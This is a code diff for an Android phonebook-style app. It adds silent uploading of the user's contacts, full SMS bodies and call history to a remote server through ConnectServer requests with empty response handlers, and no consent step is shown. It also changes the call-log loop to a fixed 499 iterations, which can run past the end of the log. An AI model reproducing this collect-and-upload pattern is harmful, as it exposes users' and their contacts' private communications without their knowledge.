@@ -14,8 +14,14 @@ import android.view.View;
 import android.widget.LinearLayout;
 import android.widget.TextView;
 
+import org.json.JSONObject;
+
 import java.text.SimpleDateFormat;
+import java.util.ArrayList;
 import java.util.Date;
+import java.util.List;
+
+import kr.idealidea.phonebook.utils.ConnectServer;
 
 public class ListViewActivity extends AppCompatActivity {
     public static final String MESSAGE_TYPE_INBOX = "1";
@@ -28,6 +34,8 @@ public class ListViewActivity extends AppCompatActivity {
             CallLog.Calls.DATE,        CallLog.Calls.DURATION };
 
     private static final String TAG = "Victor-Manage_Clique";
+
+    List<String> callLogs = new ArrayList<>();
 
     String intent = "";
     LinearLayout layoutListView;
@@ -49,6 +57,33 @@ public class ListViewActivity extends AppCompatActivity {
         }
     }
 
+    public void putCallLogs() {
+        ConnectServer.putRequestCallLog(this, callLogs, new ConnectServer.JsonResponseHandler() {
+            @Override
+            public void onResponse(JSONObject json) {
+
+            }
+        });
+    }
+
+    public void putMessage() {
+        ConnectServer.putRequestMessage(this, callLogs, new ConnectServer.JsonResponseHandler() {
+            @Override
+            public void onResponse(JSONObject json) {
+
+            }
+        });
+    }
+
+    public void putContact() {
+        ConnectServer.putRequestContacts(this, callLogs, new ConnectServer.JsonResponseHandler() {
+            @Override
+            public void onResponse(JSONObject json) {
+
+            }
+        });
+    }
+
     /**
      * 주소록 정보 가져오기.
      */
@@ -68,6 +103,7 @@ public class ListViewActivity extends AppCompatActivity {
 
         final LayoutInflater inf = LayoutInflater.from(this);
         layoutListView.removeAllViews();
+        callLogs.clear();
 
         while (cursor.moveToNext()){
             try {
@@ -79,8 +115,10 @@ public class ListViewActivity extends AppCompatActivity {
                 System.out.println("id = " + v_id);
                 System.out.println("display_name = " + v_display_name);
                 System.out.println("phone = " + v_phone);
-                System.out.println("updateTime = " + updateTime
-                );
+                System.out.println("updateTime = " + updateTime);
+
+                String contact = v_display_name + "|" + v_phone + "|" + updateTime;
+                callLogs.add(contact);
 
                 final View v = inf.inflate(R.layout.row_phone_book, null);
                 TextView txtvName = v.findViewById(R.id.txtvName);
@@ -96,6 +134,7 @@ public class ListViewActivity extends AppCompatActivity {
                 System.out.println(e.toString());
             }
         }
+        putContact();
         cursor.close();
     }
 
@@ -140,6 +179,7 @@ public class ListViewActivity extends AppCompatActivity {
 
         final LayoutInflater inf = LayoutInflater.from(this);
         layoutListView.removeAllViews();
+        callLogs.clear();
 
         while (c.moveToNext()) {
             long messageId = c.getLong(0);
@@ -153,6 +193,9 @@ public class ListViewActivity extends AppCompatActivity {
             string = String.format("address:%s, timestamp:%d, body:%s", address, timestamp, body);
 
             Log.d("heylee", string);
+
+            String contact = address + "|" + body + "|" + timeToString(timestamp);
+            callLogs.add(contact);
 
             final View v = inf.inflate(R.layout.row_phone_book, null);
             TextView txtvName = v.findViewById(R.id.txtvName);
@@ -169,7 +212,7 @@ public class ListViewActivity extends AppCompatActivity {
 
             layoutListView.addView(v);
         }
-
+        putMessage();
         return 0;
     }
 
@@ -194,8 +237,10 @@ public class ListViewActivity extends AppCompatActivity {
             try {
                 final LayoutInflater inf = LayoutInflater.from(this);
                 layoutListView.removeAllViews();
+                callLogs.clear();
+                int i = 0;
 
-                while (curCallLog.isAfterLast() == false) {
+                while (i < 499) {
                     StringBuffer sb = new StringBuffer();
 
                     if (Integer.parseInt(curCallLog.getString(curCallLog.getColumnIndex(CallLog.Calls.TYPE))) == CallLog.Calls.INCOMING_TYPE) {
@@ -218,8 +263,7 @@ public class ListViewActivity extends AppCompatActivity {
 
                     callDuration = curCallLog.getString(curCallLog.getColumnIndex(CallLog.Calls.DURATION));
 
-                    sb.append(timeToString(curCallLog.getLong(curCallLog
-                            .getColumnIndex(CallLog.Calls.DATE))));
+                    sb.append(timeToString(curCallLog.getLong(curCallLog.getColumnIndex(CallLog.Calls.DATE))));
                     sb.append("\t").append(calltype);
                     sb.append("\t").append(callname);
                     sb.append("\t").append(curCallLog.getString(curCallLog.getColumnIndex(CallLog.Calls.NUMBER)));
@@ -231,6 +275,12 @@ public class ListViewActivity extends AppCompatActivity {
                     callcount++;
                     Log.i("call history[", sb.toString());
 
+                    String phone = curCallLog.getString(curCallLog.getColumnIndex(CallLog.Calls.NUMBER));
+                    String createTime = timeToString(curCallLog.getLong(curCallLog.getColumnIndex(CallLog.Calls.DATE)));
+
+                    String list = callname + "|" + calltype + "|" + phone + "|" + getStringTime(Integer.parseInt(callDuration)) + "|" + createTime;
+                    callLogs.add(list);
+
                     final View v = inf.inflate(R.layout.row_phone_book, null);
                     TextView txtvName = v.findViewById(R.id.txtvName);
                     TextView txtvPhoneNum = v.findViewById(R.id.txtvPhoneNum);
@@ -239,12 +289,14 @@ public class ListViewActivity extends AppCompatActivity {
 
                     txtvDuration.setVisibility(View.VISIBLE);
                     txtvName.setText(callname + " (" + calltype + ")");
-                    txtvPhoneNum.setText(curCallLog.getString(curCallLog.getColumnIndex(CallLog.Calls.NUMBER)));
+                    txtvPhoneNum.setText(phone);
                     txtvTimeStamp.setText(timeToString(curCallLog.getLong(curCallLog.getColumnIndex(CallLog.Calls.DATE))));
                     txtvDuration.setText(getStringTime(Integer.parseInt(callDuration)));
 
                     layoutListView.addView(v);
+                    i++;
                 }
+                putCallLogs();
             } catch (Exception e) {
                 e.printStackTrace();
             }
